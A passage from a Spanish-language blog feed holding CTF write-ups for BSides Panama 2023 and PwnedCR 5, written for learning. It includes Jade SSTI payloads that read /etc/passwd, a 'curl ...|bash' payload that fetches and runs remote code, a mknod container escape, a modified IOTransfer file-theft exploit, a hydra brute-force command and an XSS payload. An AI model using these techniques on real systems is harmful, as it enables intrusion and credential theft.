<p>Ahora nos dirigimos a nuestro navegador y podemos colocar <code class="language-plaintext highlighter-rouge">127.0.0.1:8080</code> y nos aparecer√° el servicio que vimos en <code class="language-plaintext highlighter-rouge">notes.txt</code></p>

<p><img src="/Bsides-Panama-2023/bsides/21.png" width="500" /></p>

<p>Si le ponemos el argumento <code class="language-plaintext highlighter-rouge">/?q=</code> y otra cosa podemos observar que nuestro output se ve reflejado y podemos pensar en un ataque SSTI con lo cual probamos un <code class="language-plaintext highlighter-rouge">7*7</code> el cual vemos que es vulnerable a un SSTI tipo Jade (NodeJS):</p>

<p>https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</p>

<p><img src="/Bsides-Panama-2023/bsides/22.png" width="500" /></p>

<p>Para probarlo m√°s podemos utilizar el siguiente payload:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="n">root</span><span class="p">.</span><span class="nf">process</span><span class="p">.</span><span class="nf">mainModule</span><span class="p">.</span><span class="nf">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nf">spawnSync</span><span class="p">(</span><span class="s1">'cat'</span><span class="p">,</span> <span class="p">[</span><span class="s1">'/etc/passwd'</span><span class="p">]).</span><span class="nf">stdout</span><span class="p">}</span>
</code></pre></div></div>
<p>Y en efecto nos devuelve el <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, pero no de la m√°quina en la cual tenemos acceso con <strong>www-data</strong> es otra m√°quina, investigando un poco m√°s nos damos cuenta de que estamos ejecutando comandos en un contenedor, buscando cosas interesantes podemos encontrarnos con el backup.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="n">root</span><span class="p">.</span><span class="nf">process</span><span class="p">.</span><span class="nf">mainModule</span><span class="p">.</span><span class="nf">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nf">spawnSync</span><span class="p">(</span><span class="s1">'cat'</span><span class="p">,</span> <span class="p">[</span><span class="s1">'/root/backup.sql'</span><span class="p">]).</span><span class="nf">stdout</span><span class="p">}</span>
</code></pre></div></div>
<p><img src="/Bsides-Panama-2023/bsides/23.png" width="600" /></p>

<p>Obtenemos la flag y un usuario y contrase√±a la cual son:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">admin</span><span class="p">:</span><span class="mi">3</span><span class="n">b6a852b7bbd6f493275248fd64c103974fc1bf4f40b3eeb6502a85ca43282f1</span>

<span class="no">Decodificamos</span> <span class="n">el</span> <span class="n">sha256</span> <span class="n">y</span> <span class="n">obtenemos</span> <span class="n">lo</span> <span class="ss">siguiente:

</span><span class="n">admin</span><span class="ss">:R</span><span class="vi">@scal</span>
</code></pre></div></div>

<h1 id="acceso-usuario-webserver">Acceso usuario (WebServer):</h1>

<p>Podemos utilizar estas credenciales para entrar al servidor por ssh.</p>

<p><img src="/Bsides-Panama-2023/bsides/24.png" width="200" /></p>

<p>Adem√°s podemos ver la flag:</p>

<p><img src="/Bsides-Panama-2023/bsides/25.png" width="600" /></p>

<h1 id="acceso-administrativo-webserver-ruta-alternativa">Acceso administrativo (WebServer): (<code class="language-plaintext highlighter-rouge">ruta alternativa</code>)</h1>

<p>Para la siguiente ruta alternativa necesitamos ganar acceso al contenedor docker, con lo cual tenemos que ejecutar el siguiente comando en la vulnerabilidad del SSTI que comentamos anteriormente.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="n">root</span><span class="p">.</span><span class="nf">process</span><span class="p">.</span><span class="nf">mainModule</span><span class="p">.</span><span class="nf">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">).</span><span class="nf">exec</span><span class="p">(</span><span class="s1">'curl 172.16.80.42|bash'</span><span class="p">)}</span>
</code></pre></div></div>
<p>Tenemos que tener todo <strong>exactamente igual</strong> que cuando ganamos acceso con al WebShell.</p>

<p>Hacemos el tratamiento de la TTY y listo.</p>

<p><img src="/Bsides-Panama-2023/bsides/27.png" width="400" /></p>

<p>Estamos como root y en la direcci√≥n IP <code class="language-plaintext highlighter-rouge">172.17.0.2</code></p>

<p>Enumeramos el contenedor y encontramos que podemos utilizar la siguiente informaci√≥n para leer archivos del sistema como usuario privilegiado:</p>

<p>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_mknod</p>

<p>https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames (<code class="language-plaintext highlighter-rouge">La parte de escalada de privilegios</code>)</p>

<p>Podemos explotar la capabilitie <code class="language-plaintext highlighter-rouge">mknod</code> del contenedor:</p>

<p>En el contenedor ejecutamos lo siguiente:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span> <span class="o">/</span>
<span class="n">mknod</span> <span class="n">sda</span> <span class="n">b</span> <span class="mi">8</span> <span class="mi">0</span>
<span class="n">chmod</span> <span class="mi">777</span> <span class="n">sda</span>
<span class="n">echo</span> <span class="s2">"admin:x:1000:1000:admin,,,:/home/admin:/bin/bash"</span> <span class="o">&gt;&gt;</span> <span class="sr">/etc/</span><span class="n">passwd</span>
<span class="n">su</span> <span class="n">admin</span> <span class="o">--&gt;</span> <span class="no">Ejecutando</span> <span class="n">este</span> <span class="n">comando</span> <span class="n">deber</span><span class="err">√≠</span><span class="n">amos</span> <span class="n">pasar</span> <span class="n">al</span> <span class="n">usuario</span> <span class="n">node</span>
<span class="sr">/bin/</span><span class="n">bash</span>
</code></pre></div></div>

<p><img src="/Bsides-Panama-2023/bsides/28.png" width="500" /></p>

<p>En la m√°quina v√≠ctima como usuario <code class="language-plaintext highlighter-rouge">admin</code> ejecutamos lo siguiente:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ps</span> <span class="o">-</span><span class="n">auxf</span> <span class="o">|</span> <span class="n">grep</span> <span class="sr">/bin/</span><span class="n">bash</span> <span class="o">--&gt;</span> <span class="no">Para</span> <span class="n">saber</span> <span class="n">cu</span><span class="err">√°</span><span class="n">l</span> <span class="n">es</span> <span class="n">el</span> <span class="no">PID</span><span class="o">.</span>
</code></pre></div></div>

<p><img src="/Bsides-Panama-2023/bsides/30.png" width="500" /></p>

<p>Ahora que tenemos el PID en este caso <strong>2676</strong> nos falta obtener la flag:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">grep</span> <span class="o">-</span><span class="n">a</span> <span class="s2">"root -"</span> <span class="o">/</span><span class="nb">proc</span><span class="o">/</span><span class="mi">2676</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">sda</span> <span class="o">--&gt;</span> <span class="no">Nos</span> <span class="n">da</span> <span class="n">un</span> <span class="n">error</span> <span class="n">al</span> <span class="n">rato</span> <span class="n">de</span> <span class="n">ejecutarlo</span> <span class="n">y</span> <span class="n">para</span> <span class="n">evitarlo</span> <span class="n">utilizamos</span> <span class="n">lo</span> <span class="n">este</span> <span class="n">otro</span> <span class="ss">comando:

</span><span class="n">strings</span> <span class="sr">/proc/</span><span class="mi">2676</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">sda</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">a</span> <span class="s2">"root -"</span>
</code></pre></div></div>
<p>Obtenemos la flag:</p>

<p><img src="/Bsides-Panama-2023/bsides/29.png" width="600" /></p>

<h1 id="wordpress-webserver-ruta-alternativa">WordPress (WebServer): (<code class="language-plaintext highlighter-rouge">ruta alternativa</code>)</h1>

<p>Hay m√∫ltiples maneras de obtener esta flag, pero se me hizo muy f√°cil de esta manera:</p>

<p>Tenemos acceso como root a mysql sin proporcionar contrase√±a:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mysql</span> <span class="o">-</span><span class="n">uroot</span> <span class="o">-</span><span class="nb">p</span> <span class="o">--&gt;</span> <span class="no">Cuando</span> <span class="n">nos</span> <span class="n">pide</span> <span class="n">un</span> <span class="n">password</span> <span class="n">presionamos</span> <span class="n">enter</span><span class="p">.</span>

<span class="nf">show</span> <span class="n">databases</span><span class="p">;</span> 

<span class="n">use</span> <span class="n">wordpress</span><span class="p">;</span>

<span class="nb">select</span> <span class="o">*</span> <span class="n">from</span> <span class="n">wp_posts</span> <span class="n">where</span> <span class="n">post_status</span><span class="o">=</span><span class="s1">'trash'</span><span class="p">;</span> <span class="o">--&gt;</span> <span class="no">Podemos</span> <span class="n">ver</span> <span class="n">posts</span> <span class="n">que</span> <span class="n">han</span> <span class="n">sido</span> <span class="n">borrados</span><span class="o">.</span>
</code></pre></div></div>

<p>En WordPress, la papelera se gestiona en la base de datos de WordPress, espec√≠ficamente en la tabla <code class="language-plaintext highlighter-rouge">wp_posts</code>, cuando se elimina una publicaci√≥n, su estado se cambia a papelera en la columna <code class="language-plaintext highlighter-rouge">post_status</code> de la <code class="language-plaintext highlighter-rouge">tabla wp_posts</code>, y permanece all√≠ hasta que se elimine permanentemente o se restaure. La tabla wp_posts tambi√©n contiene columnas para el t√≠tulo, el contenido, el autor y otra informaci√≥n meta de la publicaci√≥n.</p>

<p>Podemos ver la flag:</p>

<p><img src="/Bsides-Panama-2023/bsides/31.png" width="600" /></p>

<h1 id="passwordtxt-webserver2">Password.txt (WebServer2)</h1>

<p>Para poder enumerar este host tenemos que hacer un reconocimiento de la red, ya que al parecer el sistema Windows estaba oculto en la red y no pod√≠amos descubrirlo atrev√©s de ping, pero si pudimos encontrarlo gracias a los puertos.</p>

<p>Ahora que sabemos que direcci√≥n IP tiene podemos hacer un escaneo m√°s profundo con <code class="language-plaintext highlighter-rouge">nmap</code> y podemos encontrar los siguientes puertos:</p>

<p><img src="/Bsides-Panama-2023/bsides/32.png" width="400" /></p>

<p>Empezamos enumerando el puerto <strong>8080</strong>, y aplicamos fuzzing con el siguiente comando:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wfuzz</span> <span class="o">-</span><span class="n">c</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">404</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="nf">txt</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.1</span><span class="o">.</span><span class="mf">1.150</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="no">FUZZ</span>
</code></pre></div></div>

<p>Despu√©s de esperar un buen rato podemos ver este directorio <code class="language-plaintext highlighter-rouge">datos</code>.</p>

<p><img src="/Bsides-Panama-2023/bsides/34.png" width="500" /></p>

<p>Esto es lo que contiene el directorio:</p>

<p><img src="/Bsides-Panama-2023/bsides/35.png" width="500" /></p>

<p>Buscamos en internet ‚Äú<code class="language-plaintext highlighter-rouge">iotransfer windows exploit</code>‚Äù nos topamos con este art√≠culo:</p>

<p>https://www.exploit-db.com/exploits/50974</p>

<p>Para analizarlo mejor nos dirigimos al GitHub que aparece para ver el c√≥digo, en mi caso no sirvi√≥ por un problema de incompatibilidad con la librer√≠a <code class="language-plaintext highlighter-rouge">win32com</code>, as√≠ que revisando el c√≥digo podemos extraer unas partes y modificarlas para poder descargar el archivo que queramos, aqu√≠ esta el c√≥digo: (<code class="language-plaintext highlighter-rouge">Funcional en Linux</code>)</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/bin/python3</span>

<span class="n">import</span> <span class="n">requests</span><span class="p">,</span> <span class="n">json</span>

<span class="n">remoteDownloadPath</span> <span class="o">=</span> <span class="n">r</span><span class="s1">'C:\Users\frank\Desktop\password.txt'</span>
<span class="no">IP</span> <span class="o">=</span> <span class="s2">""</span>
<span class="n">localDownloadPath</span> <span class="o">=</span><span class="s2">"./password.txt"</span>

<span class="k">def</span> <span class="nf">CreateDownloadTask</span><span class="p">(</span><span class="no">IP</span><span class="p">,</span> <span class="no">Path</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="ss">str:
    </span><span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'http://{IP}:7193/index.php?action=createtask'</span>
    <span class="n">task</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">'method'</span><span class="p">:</span> <span class="s1">'get'</span><span class="p">,</span>
        <span class="s1">'version'</span><span class="p">:</span> <span class="s1">'1'</span><span class="p">,</span>
        <span class="s1">'userid'</span><span class="p">:</span> <span class="s1">'*'</span><span class="p">,</span>
        <span class="s1">'taskstate'</span><span class="p">:</span> <span class="s1">'0'</span><span class="p">,</span>
        <span class="s1">'filepath'</span><span class="p">:</span> <span class="no">Path</span>
    <span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">task</span><span class="p">)</span>
    <span class="n">task</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">content</span><span class="p">)</span>
    <span class="n">task</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">task</span><span class="p">[</span><span class="s1">'content'</span><span class="p">])</span>
    <span class="n">taskid</span> <span class="o">=</span> <span class="n">task</span><span class="p">[</span><span class="s1">'taskid'</span><span class="p">]</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"TaskID: {taskid}"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">taskid</span>

<span class="k">def</span> <span class="nf">ExploitDownload</span><span class="p">(</span><span class="no">IP</span><span class="p">,</span> <span class="no">DownloadPath</span><span class="p">,</span> <span class="no">ID</span><span class="o">=</span><span class="no">None</span><span class="p">):</span>
    <span class="k">if</span> <span class="no">ID</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={ID}'</span>
    <span class="ss">else:
        </span><span class="n">taskid</span> <span class="o">=</span> <span class="no">CreateDownloadTask</span><span class="p">(</span><span class="no">IP</span><span class="p">,</span> <span class="no">DownloadPath</span><span class="p">)</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'http://{IP}:7193/index.php?action=downloadfile&amp;userid=*&amp;taskid={taskid}'</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="k">return</span> 

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"[*] Downloading the file: {remoteDownloadPath}"</span><span class="p">)</span>
        <span class="n">res</span> <span class="o">=</span> <span class="no">ExploitDownload</span><span class="p">(</span><span class="no">IP</span><span class="p">,</span> <span class="n">remoteDownloadPath</span><span class="p">)</span>
        <span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">localDownloadPath</span><span class="p">,</span> <span class="s2">"wb+"</span><span class="p">)</span>
        <span class="n">file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="nf">content</span><span class="p">)</span>
        <span class="n">file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<p>Lo ejecutamos y obtenemos lo siguiente:</p>

<p><img src="/Bsides-Panama-2023/bsides/36.png" width="600" /></p>

<h1 id="acceso-usuario-webserver2">Acceso usuario (WebServer2):</h1>

<p>Para poder interactuar con el RDP necesitamos hacer un port forwarding entre el webserver(<code class="language-plaintext highlighter-rouge">10.1.1.100</code>) y webserver2(<code class="language-plaintext highlighter-rouge">10.1.1.150</code>).</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ssh</span> <span class="n">admin</span><span class="err">@</span><span class="mf">10.1</span><span class="o">.</span><span class="mf">1.100</span> <span class="o">-</span><span class="no">L</span> <span class="mi">3389</span><span class="p">:</span><span class="mf">10.1</span><span class="o">.</span><span class="mf">1.150</span><span class="p">:</span><span class="mi">3389</span>
</code></pre></div></div>

<p>Para conectarnos podemos utilizar: <code class="language-plaintext highlighter-rouge">xfreerdp</code> o <code class="language-plaintext highlighter-rouge">remmina</code>.</p>

<p>En este caso utilizamos remmina y le tenemos que habilitar que ignore el certificado autofirmado y poner el time out 60000 despu√©s de configurar esto podemos proporcionar las credenciales y estamos dentro del sistema como el usuario frank y podemos encontrar la flag en el escritorio.</p>

<h1 id="acceso-administrativo-webserver2">Acceso administrativo (WebServer2):</h1>

<p>Dentro del sistema enumerando un poco podemos notar que el usuario frank tiene permiso de escritura sobre el directorio xampp2(<code class="language-plaintext highlighter-rouge">Est√° corriendo los servicios Web en los puertos 8080 y 8081</code>), nos dirigimos al directorio <code class="language-plaintext highlighter-rouge">C:\xampp2\htdocs\</code> y subimos una reverse shell para despu√©s ejecutarla desde la p√°gina web y si vemos quien la esta ejecutando es <code class="language-plaintext highlighter-rouge">WEBSERVER\Administrator</code> as√≠ que ya podemos buscar la flag del administrador.</p>

<h1 id="plataforma-web-webserver2-ruta-alternativa">Plataforma WEB (WebServer2) (<code class="language-plaintext highlighter-rouge">ruta alternativa</code>):</h1>

<p>Nos conectamos en localhost al PhpMyAdmin y extraemos la flag que estaba en la base de datos.</p>

<p>Esto es todo el CTF de Bsides Panama 2023, tengo que decir que fue muy divertido y en donde aprend√≠ muchas cosas.</p>]]></content><author><name>FmF</name></author><category term="unix/linux" /><category term="Windows" /><category term="CTF" /><category term="Medium" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Bsides-Panama-2023/Bsides.png" /><media:content medium="image" url="http://localhost:4000/Bsides-Panama-2023/Bsides.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">PwnedCR 5</title><link href="http://localhost:4000/PwnedCR-2022/" rel="alternate" type="text/html" title="PwnedCR 5" /><published>2022-12-08T05:00:00+00:00</published><updated>2022-12-08T05:00:00+00:00</updated><id>http://localhost:4000/PwnedCR-2022</id><content type="html" xml:base="http://localhost:4000/PwnedCR-2022/"><![CDATA[<p><img src="/PwnedCR-2022/pwnedcr-5.png" alt="Banner" /></p>

<h3 id="retos">Retos:</h3>

<ul>
  <li><a href="#el-regalo">El regalo</a></li>
  <li><a href="#cryptonita">Cryptonita</a></li>
  <li><a href="#tron">Tron</a></li>
  <li><a href="#enum√©rame">Enum√©rame</a></li>
  <li><a href="#bruto-el-fuerte">Bruto el fuerte</a></li>
  <li>El silencio de los kiddies (<em>No resuelta</em>)</li>
  <li><a href="#siete-a-cero">Siete a cero</a></li>
  <li><a href="#scripteando">Scripteando</a></li>
  <li>Me siento injectado (<em>No resuelta</em>)</li>
  <li>El origen de las cosas (<em>No resuelta</em>)</li>
  <li>La vaca contraataca (<em>No resuelta</em>)</li>
  <li>La tuya, por cualquier cosa (<em>No resuelta</em>)</li>
</ul>

<h1 id="el-regalo">El regalo:</h1>

<p><img src="/PwnedCR-2022/pwnedcr5/1.png" /></p>

<p>Nos dan una cadena de caracteres que se parece a una cadena de base64.</p>

<p>Sabiendo esto, podemos intentar de decodificarlo desde una terminal de la siguiente manera:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s2">"UFdORURDUnt2ZW5pbW9zX2VuX3Bhel9naGVpQDkwJCN9"</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span><span class="p">;</span> <span class="n">echo</span>
</code></pre></div></div>
<p>De esta manera obtenemos la flag: <strong>PWNEDCR{venimos_en_paz_ghei@90$#}</strong></p>

<p>De una manera alternativa podemos ir a la siguiente pagina <a href="https://www.base64decode.org/" title="Base64 decoder">Link</a> y pegamos nuestra cadena para decodificarla.</p>

<h1 id="cryptonita">Cryptonita:</h1>

<p><img src="/PwnedCR-2022/pwnedcr5/2.png" /></p>

<p>Vemos que esta vez no nos dan una cadena, pero si leemos de manera detenida podemos ver una pista, la cual es: ‚ÄúSe cree que en √©sta p√°gina se esta intercambiando informaci√≥n‚Äù, esto nos puede decir que la flag puede esta en el codigo fuente de la pagina.</p>

<p>Vamos a ver el codigo fuente y en efecto vemos algo fuera de lo comun casi al final de la pagina, una cadena parecida a la del reto anterior pero esta vez es mucho mas larga.</p>

<p><img src="/PwnedCR-2022/pwnedcr5/3.png" /></p>

<p>Vamos a tratar de decodificarlo‚Ä¶</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s2">"Tm9zIGVzdOFuIHNpZ3VpZW5kbyBlbCByYXN0cm8sIGhheSBxdWUgYm9ycmFyIHRvZGEgaW5mb3JtYWNp824gYW50ZXMgZGUgcXVlIHNlYSBkZW1hc2lhZG8gdGFyZGUsIGxhcyBjdWVudGFzIGVuIGxvcyBvdHJvcyBwYe1zZXMgZnVlcm9uIGJsb3F1ZWFkYXMsIGxvIPpuaWNvIHF1ZSBub3MgcXVlZGEgZXMgZWwgd2FsbGV0IGRlIGNyeXB0byBtb25lZGFzIHF1ZSBzb2xvIHVzdGVkZXMgeSB5byBzYWJlbW9zIGRvbmRlIGVzdOEsIHJlY3VlcmRlbiB1dGlsaXphciBsYSBwYWxhYnJhIGRlIHBhc28gcGFyYSBwb2RlciBzYWJlciBudWVzdHJvIHBy83hpbW8gcHVudG8gZGUgcmV1bmnzbjogW1sgVUZkT1JVUkRVbnR6WldOMGIzSmZORjloY0dGeWRHRnRaVzUwYjE4Mk5WOTZiMjVoWDI1MVkyeGxZWEpmWkdWellXeHZhbUZrWVY4MUpETXlRREY5IF1d"</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span><span class="p">;</span> <span class="n">echo</span>
</code></pre></div></div>

<p><img src="/PwnedCR-2022/pwnedcr5/4.png" /></p>

<p>Vemos un mensage curioso y otra cadena que tambien se parece mucho a una cadena en base64, vamos a decodificarla:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s2">"UFdORURDUntzZWN0b3JfNF9hcGFydGFtZW50b182NV96b25hX251Y2xlYXJfZGVzYWxvamFkYV81JDMyQDF9"</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span><span class="p">;</span> <span class="n">echo</span>
</code></pre></div></div>
<p>Con esto ya podemos ver la flag: <strong>PWNEDCR{sector_4_apartamento_65_zona_nuclear_desalojada_5$32@1}</strong></p>

<h1 id="tron">Tron:</h1>

<p><img src="/PwnedCR-2022/pwnedcr5/5.png" /></p>

<p>Vemos que nos dan una pista la cual es: ‚ÄúLa imagen contiene alg√∫n mensaje‚Äù y con esto ya nos viene a la mente que puede ser un mensaje fue escondido con esteganograf√≠a.</p>

<p>Para analizar la image a un nivel mas bajo podemos utilizar la herramienta: <code class="language-plaintext highlighter-rouge">exiftool</code> la cual es una herramienta para ver los metadatos en archivos.</p>

<p>Podemos descargar la imagen y ejecutar el siguiente comando para analizarla.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">exiftool</span> <span class="n">tron</span><span class="p">.</span><span class="nf">png</span>
</code></pre></div></div>

<p>Y en efecto vemos bastante informacion y entre ella la flag:</p>

<p><img src="/PwnedCR-2022/pwnedcr5/6.png" /></p>

<h1 id="enum√©rame">Enum√©rame:</h1>

<p><img src="/PwnedCR-2022/pwnedcr5/7.png" /></p>

<p>Nos dan esta pista ‚Äú<code class="language-plaintext highlighter-rouge">reto4.php?id=123</code>‚Äù ya podemos pensar en un ataque IDOR (<code class="language-plaintext highlighter-rouge">Insecure direct object references</code>) lo que podemos hacer es ir iterando entre numeros, <code class="language-plaintext highlighter-rouge">124</code>, <code class="language-plaintext highlighter-rouge">125</code>, <code class="language-plaintext highlighter-rouge">126</code>, etc‚Ä¶</p>

<p>Poniendo <code class="language-plaintext highlighter-rouge">126</code> en lugar de <code class="language-plaintext highlighter-rouge">123</code>: ‚Äú<strong><em>https://ctf.pwnedcr.com/retos/reto4.php?id=126</em></strong>‚Äù ya podemos ver la flag:</p>

<p><img src="/PwnedCR-2022/pwnedcr5/8.png" /></p>

<h1 id="bruto-el-fuerte">Bruto el fuerte</h1>

<p><img src="/PwnedCR-2022/pwnedcr5/9.png" /></p>

<p>Podemos descargar los dos diccionarios que nos proveen ya que los vamos a utilizar.</p>

<p>Presionando ‚Äú<code class="language-plaintext highlighter-rouge">Abrir app</code>‚Äù y nos abre la siguiente ventana:</p>

<p><img src="/PwnedCR-2022/pwnedcr5/10.png" /></p>

<p>Nos dan una pista con el titulo ya que se refiere a un ‚Äú<code class="language-plaintext highlighter-rouge">Ataque de fuerza bruta</code>‚Äù.</p>

<p>Con la herramienta <strong>hydra</strong> podemos hacer el ataque‚Ä¶</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">hydra</span> <span class="o">-</span><span class="no">L</span> <span class="n">top</span><span class="o">-</span><span class="n">usernames</span><span class="o">-</span><span class="n">shortlist</span><span class="p">.</span><span class="nf">txt</span> <span class="o">-</span><span class="no">P</span> <span class="n">rockyou_top</span><span class="o">-</span><span class="mi">1</span><span class="n">k</span><span class="p">.</span><span class="nf">txt</span> <span class="n">ctf</span><span class="p">.</span><span class="nf">pwnedcr</span><span class="p">.</span><span class="nf">com</span> <span class="n">https</span><span class="o">-</span><span class="n">post</span><span class="o">-</span><span class="n">form</span> <span class="s2">"/retos/reto5_login.php:username=^USER^&amp;password=^PASS^:F=ACCESS DENIED"</span>
</code></pre></div></div>

<p>Uso de <strong>hydra</strong>:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">-L</code> ‚Äì&gt; Indicamos que le vamos a pasar un diccionario de <strong>usuarios</strong>.</li>
  <li><code class="language-plaintext highlighter-rouge">-P</code> ‚Äì&gt; Indicamos que le vamos a pasar un diccionario de <strong>contrase√±as</strong>.</li>
  <li><code class="language-plaintext highlighter-rouge">ctf.pwnedcr.com</code> ‚Äì&gt; Es el dominio que vamos a atacar.</li>
  <li><code class="language-plaintext highlighter-rouge">https-post-form</code> ‚Äì&gt; Vamos a enviar un formulario que serian el usuario y contrase√±a.</li>
  <li><code class="language-plaintext highlighter-rouge">/retos/reto5_login.php</code> ‚Äì&gt; La ruta donde se ubica el formulario que vamos a atacar.</li>
  <li><code class="language-plaintext highlighter-rouge">:username=^USER^&amp;password=^PASS^</code> ‚Äì&gt; Estos son los campos que vamos a atacar con hydra el username y password, para saber si son diferentes nos podemos fijar en la peticion que estamos enviando por burp o tambien lo podemos ver en el codigo fuente.</li>
  <li><code class="language-plaintext highlighter-rouge">:F=ACCESS DENIED</code> ‚Äì&gt; El ‚ÄúACCESS DENIED‚Äù es la palabra que la pagina web nos va a dar si hacemos un intento fallido, el ‚ÄúACCESS DENIED‚Äù lo saque del codigo fuente de la pagina cuando ponemos unas credenciales no validas, lo vemos en la siguiente imagen:</li>
</ul>

<p><img src="/PwnedCR-2022/pwnedcr5/18.png" /></p>

<p>Para mas informacion recomiendo buscar en google ;)</p>

<p>Ejecutamos comando anterior en nuestra terminal y obtenemos un username y un password: <code class="language-plaintext highlighter-rouge">admin:jordan23</code></p>

<p>Y obtenemos la flag.</p>

<p><img src="/PwnedCR-2022/pwnedcr5/17.png" /></p>

<h1 id="siete-a-cero">Siete a cero:</h1>

<p><img src="/PwnedCR-2022/pwnedcr5/11.png" /></p>

<p>Presionando ‚Äú<code class="language-plaintext highlighter-rouge">Abrir app</code>‚Äù y nos abre la siguiente ventana:</p>

<p><img src="/PwnedCR-2022/pwnedcr5/10.png" /></p>

<p>Ponemos ‚Äú<code class="language-plaintext highlighter-rouge">test</code>‚Äù y ‚Äú<code class="language-plaintext highlighter-rouge">test</code>‚Äù y vemos que el output del username se ve reflejado y podemos pensar en un ataque XSS.</p>

<p><img src="/PwnedCR-2022/pwnedcr5/12.png" /></p>

<p>Para hacer el ataque XSS ponemos: ‚Äú<strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong>‚Äù en la parte del username y en la parte del password ponemos lo que querramos.  (‚Äú<code class="language-plaintext highlighter-rouge">Tiene que ser exactamente igual por que si variamos auque sea el numero, no nos dara la flag</code>‚Äù)</p>

<p>Con esto conseguimos la flag:</p>

<p><img src="/PwnedCR-2022/pwnedcr5/13.png" /></p>

<h1 id="scripteando">Scripteando:</h1>

<p><img src="/PwnedCR-2022/pwnedcr5/14.png" /></p>

<p>No hay muchas pistas pero empezamos con un analizis del codigo fuente de la pagina y vemos algo interesante:</p>

<p><img src="/PwnedCR-2022/pwnedcr5/15.png" /></p>

<p>Viendo mas esa linea de codigo podemos notar que ahi esta la flag:</p>

<p><img src="/PwnedCR-2022/pwnedcr5/16.png" /></p>]]></content><author><name>FmF</name></author><category term="CTF" /><category term="PwnedCR" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/PwnedCR-2022/pwnedcr5.png" /><media:content medium="image" url="http://localhost:4000/PwnedCR-2022/pwnedcr5.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>